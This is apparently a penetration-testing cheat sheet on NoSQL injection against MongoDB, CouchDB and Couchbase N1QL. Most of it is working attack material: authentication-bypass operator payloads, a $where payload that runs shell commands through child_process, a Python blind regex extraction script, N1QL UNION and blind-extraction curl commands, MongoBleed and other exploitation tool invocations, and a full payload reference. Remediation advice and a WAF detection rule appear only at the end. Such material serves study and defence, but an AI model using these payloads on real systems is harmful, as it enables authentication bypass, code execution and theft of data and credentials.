# NoSQL Injection & Database Security (MongoDB, CouchDB, Couchbase)

## Overview

NoSQL databases have become increasingly prevalent in modern web applications due to their flexibility and scalability. However, they introduce unique security challenges that differ from traditional SQL injection vulnerabilities. NoSQL injection occurs when user-supplied input is improperly sanitized and directly incorporated into database queries, allowing attackers to manipulate query logic, bypass authentication, or extract sensitive data.

This guide covers exploitation techniques for MongoDB, CouchDB, and Couchbase (N1QL), including recent real-world vulnerabilities and active exploitation campaigns.

---

## MongoDB Injection & Exploitation

### Understanding MongoDB Query Operators

MongoDB uses JSON-like documents and supports various query operators that can be abused when user input is not properly validated:

| Operator | Function | Injection Use |
|----------|----------|----------------|
| `$ne` | Not equal | Bypass authentication by making conditions always true |
| `$gt` / `$lt` | Greater than / Less than | Extract data via boolean conditions |
| `$regex` | Pattern matching | Extract data character by character |
| `$where` | JavaScript execution | Potential RCE if JavaScript engine enabled |
| `$or` | Logical OR | Combine malicious conditions with legitimate ones |
| `$exists` | Field existence check | Bypass field validation |

### Authentication Bypass via Operator Injection

One of the most common NoSQL injection patterns involves injecting operators into login or authentication fields.

**Vulnerable Code Example:**
```javascript
app.post('/login', async (req, res) => {
  const { username, password } = req.body;
  const user = await db.collection('users').findOne({
    username: username,
    password: password
  });
  // No type checking - directly passes user input
});
```

**Exploitation Payloads:**

In URL parameters:
```
username[$ne]=toto&password[$ne]=toto
```

In JSON body:
```json
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$gt":""}, "password": {"$gt":""}}
{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}
```

When `application/x-www-form-urlencoded` content-type is enforced but JSON is blocked, array notation can still inject operators as some parsing libraries automatically convert parameter arrays to objects:
```
token[$ne]=null
```

### $where JavaScript Injection & Remote Code Execution

The `$where` operator executes arbitrary JavaScript expressions on the MongoDB server. When user input is concatenated into a `$where` clause, it can lead to severe compromise.

**Vulnerable Pattern:**
```javascript
db.collection('users').find({ $where: `this.username == '${userInput}'` })
```

**Exploitation:**

Basic boolean injection:
```
' || 'a'=='a
' || 1==1 //
```

JavaScript execution for data extraction:
```json
{"$where": "this.password.length < 8"}
{"$where": "this.username.match(/^admin/)"}
```

**CVE-2024-53900** - Mongoose RCE via `$where` Operator:
This vulnerability demonstrated that improper use of the `$where` operator in Mongoose (MongoDB ODM) allows Remote Code Execution. A CTF challenge built around this vulnerability shows how attackers can inject JavaScript code into the `$where` condition to retrieve flags and potentially execute arbitrary commands on the server.

**Example exploitation for CVE-2024-53900:**
```json
{
  "username": "admin",
  "$where": "function() { return this.username == 'admin' && (() => { require('child_process').exec('cat flag.txt', (e,d) => { console.log(d) }); return true })(); }"
}
```

### Regex-Based Data Extraction (Blind NoSQL Injection)

When detailed error messages are available, regex injection enables character-by-character data extraction.

**Real-world example from NahamCon CTF 2025 - "NoSequel"**:
The challenge involved a movie database search function where the flag resided in a separate "Flags" collection. Error messages revealed the query structure:

```
Query: a
Error: Only regex queries are supported on the flag collection

Query: {$regex: "The"}
Error: Only regex on 'flag' field is supported

Query: flag: {$regex: "The"}
Result: No results found

Query: flag: {$regex: "flag"}
Result: Pattern matched
```

**Automated extraction script:**
```python
import string
import requests

url = 'http://target.com/search'
flag = 'flag{'
charset = list(string.digits) + list(string.ascii_lowercase)

while len(flag) != 37:  # Expected flag length
    for char in charset:
        payload = {
            'query': f'flag: {{$regex: "^{flag + char}"}}',
            'collection': 'flags'
        }
        response = requests.post(url, data=payload)
        if 'Pattern matched' in response.text:
            flag += char
            print(flag)
            break
```

### Triggering Syntax Errors for Fingerprinting

Inject special characters to cause MongoDB syntax errors and confirm vulnerability:
```
' " \ ; { }
```

Successful error injection often reveals database type and version information.

### MongoDB Status Endpoint Exposure

The MongoDB status endpoint can leak sensitive information:
```
mongodbserver:port/status?text=1
```

---

## CouchDB Injection

### CouchDB Authentication Bypass (CVE-2024-57177)

**Vulnerability Overview**:
A vulnerability in the `@perfood/couch-auth` package (CVE-2024-57177) allows improper neutralization of special elements via the email change confirmation request. Attackers can run limited commands or leak server-side information by sending a specially crafted host header.

**Affected Package:** `@perfood/couch-auth` versions prior to patch (no fixed version available as of disclosure)

**Impact:** Limited command execution and server-side information disclosure

---

## Couchbase N1QL Injection

### N1QL (SQL for JSON) Injection Fundamentals

N1QL (Non-First Normal Form Query Language) is Couchbase's SQL-like query language. It supports UNION SELECT operations and various functions that can be exploited similarly to SQL injection.

**Identifying N1QL Injection:**

Injecting a single quote causes syntax errors:
```bash
curl -G "http://localhost:3000/example-1/breweries" --data-urlencode "city='aaa"
# Response contains: "syntax error - at aaa"
```

**Database Fingerprinting with N1QL-specific functions**:

Test for N1QL by injecting database-specific functions:
```
http://localhost:3000/breweries?city=13373' OR ENCODE_JSON({}) == "{}" OR '1'='1
http://localhost:3000/breweries?city=13373' OR ENCODE_JSON((SELECT * FROM system:keyspaces)) != "{}" OR '1'='1
```

**UNION-based Data Extraction**:

Extract keyspaces (database buckets):
```bash
curl -G "http://localhost:3000/example-1/breweries" --data-urlencode "city=' AND '1'='0' UNION SELECT * FROM system:keyspaces WHERE '1'='1"
```

Extract data in JSON format using `ENCODE_JSON`:
```bash
curl -G "http://localhost:3000/example-1/breweries" --data-urlencode "city=13373' UNION SELECT ENCODE_JSON((SELECT * FROM system:keyspaces ORDER BY id)) WHERE '1'='1"
```

**Boolean-based Blind Extraction**:

Using `SUBSTR` to extract character by character:
```bash
curl -G "http://localhost:3000/example-1/breweries" --data-urlencode "city=New York' AND '{' = SUBSTR(ENCODE_JSON((SELECT * FROM system:keyspaces ORDER BY id)), 1, 1) AND '1'='1"
```

### N1QLMap - Automated Exploitation Tool

N1QLMap is a dedicated tool for automating N1QL injection exploitation:

```bash
./n1qlMap.py http://localhost:3000 --request example_request_1.txt --keyword beer-sample --extract travel-sample
```

---

## Recent Critical Vulnerabilities (2025)

### MongoBleed - CVE-2025-14847

**Severity:** Critical (CVSS 8.7)

**Discovery Date:** December 2025

**Active Exploitation:** Yes - being actively exploited in the wild with over 87,000 potentially vulnerable instances exposed worldwide

**Root Cause:** Improper handling of zlib-compressed wire protocol messages. The server allocates a buffer based on a claimed size but only partially fills it during decompression, causing uninitialized heap memory to be included in responses.

**Exploit Mechanism**:
The attack sends a crafted `OP_COMPRESSED` message advertising a large uncompressed size while containing only a minimal compressed payload. The server returns uninitialized heap memory that may contain:
- User credentials and authentication material
- Configuration data and API keys
- Other in-memory secrets

**Proof of Concept Available:** Yes - `mongobleed.py` published by Joe DeSimone

**Affected Versions**:
- MongoDB 8.2.0 through 8.2.2
- MongoDB 8.0.0 through 8.0.16
- MongoDB 7.0.0 through 7.0.27
- MongoDB 6.0.0 through 6.0.26
- MongoDB 5.0.0 through 5.0.31
- MongoDB 4.4.0 through 4.4.29
- All MongoDB Server v4.2, v4.0, and v3.6 versions

**Fixed Versions:** 8.2.3, 8.0.17, 7.0.28, 6.0.27, 5.0.32, 4.4.30

**Mitigation**:
1. Upgrade immediately to patched versions
2. If upgrade impossible, disable zlib compression by starting mongod/mongos with:
   ```
   networkMessageCompressors=snappy,zstd
   ```
   or
   ```
   net.compression.compressors=snappy,zstd
   ```

**Geographic Distribution of Vulnerable Instances**:
Most exposed instances located in United States, China, Germany, and India.

---

## Exploitation Tools

### MongoBleed
```bash
# https://github.com/joe-desimone/mongobleed
python mongobleed.py <target_ip> <port>
```

### NoSQLMap
```bash
# https://github.com/codingo/NoSQLMap
python NoSQLMap.py
```

### Nosql-Exploitation-Framework
```bash
# https://github.com/torque59/Nosql-Exploitation-Framework
python nosqlframework.py -h
```

### nosqli
```bash
# https://github.com/Charlie-belmer/nosqli
nosqli scan -t http://localhost:4000/user/lookup?username=test
```

### N1QLMap
```bash
# https://github.com/FSecureLABS/N1QLMap
./n1qlMap.py http://localhost:3000 --request example_request_1.txt --keyword beer-sample --extract travel-sample
```

---

## Complete Payload Reference

### Authentication Bypass
```
# URL parameters
username[$ne]=toto&password[$ne]=toto
username[$ne]=null&password[$ne]=null
username[$gt]=&password[$gt]=

# JSON body
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$gt":""}, "password": {"$gt":""}}
{"username": {"$regex": "^.*$"}, "password": {"$regex": "^.*$"}}
{"$or": [{"username": "admin"}, {"username": {"$gt": ""}}]}

# Form data with array notation (bypasses content-type restrictions)
username[$ne]=null
password[$regex]=.*
```

### $where JavaScript Injection
```
' || 'a'=='a
' || 1==1 //
' && this.password.match(/^a/)//
' && function() { return this.username == 'admin' }()//
```

### N1QL Injection Payloads
```
' OR ENCODE_JSON({}) == "{}" OR '1'='1
' UNION SELECT * FROM system:keyspaces WHERE '1'='1
' AND '{' = SUBSTR(ENCODE_JSON((SELECT * FROM system:keyspaces)), 1, 1) AND '1'='1
```

### Comment Out Remaining Query
```
//          (JavaScript comment)
```

---

## Detection & Fingerprinting

### MongoDB Syntax Error Triggers
```
' " \ ; { }
```

### Version Detection
```javascript
{"$where": "return db.version() > '4.0'"}
```

### N1QL Database Fingerprinting
- Inject `ENCODE_JSON` or `META()` functions
- Query system keyspaces: `SELECT * FROM system:datastore`
- Check for `system:keyspaces` responses

---

## Remediation Guidelines

### Input Validation
```javascript
// Force type checking
if (typeof username !== 'string' || typeof password !== 'string') {
    throw new Error('Invalid input type');
}

// Cast to expected types
const username = String(req.body.username);
const password = String(req.body.password);
```

### Parameterized Queries
Avoid passing user input directly into query operators. Use schema validation and allowlisting for expected input patterns (e.g., alphanumeric only for usernames).

### MongoDB Security Configuration
- Disable `$where` JavaScript execution if not required
- Disable zlib compression if using vulnerable versions
- Enable audit logging: `auditLog.destination=file`
- Apply least privilege principle for database users

### WAF Rules
```
SecRule ARGS_JSON|ARGS_POST_JSON "@rx \$\w+" "id:'999',phase:2,block,msg:'Potential NoSQL Injection'"
```

---

## References

- [1] SecPod. "MongoBleed: MongoDB Zlib Vulnerability (CVE-2025-14847) and how to remediate it" (2025)
- [2] Snyk Vulnerability Database. "CVE-2024-57177 - @perfood/couch-auth Injection" (2025)
- [3] ReverseCS Labs. "N1QL Injection: Kind of SQL Injection in a NoSQL Database" (2020)
- [4] CTFtime. "NahamCon CTF 2025 - NoSequel Writeup" (2025)
- [5] Intigriti BugQuest2025 - Day 27 (2025)
- [6] Security Affairs. "MongoBleed flaw actively exploited in attacks in the wild" (2025)
- [7] GitHub. "CVE-2024-53900 - Mongo Vulnerable Lab" (2025)
- [8] Baidu Cloud. "Burp靶场实战：NoSQL注入漏洞深度解析与防御指南" (2025)
- [9] heise online. "MongoBleed: Exploit for critical vulnerability in MongoDB makes attacks easier" (2025)
- [10] Invicti. "Authentication bypass via MongoDB operator injection"
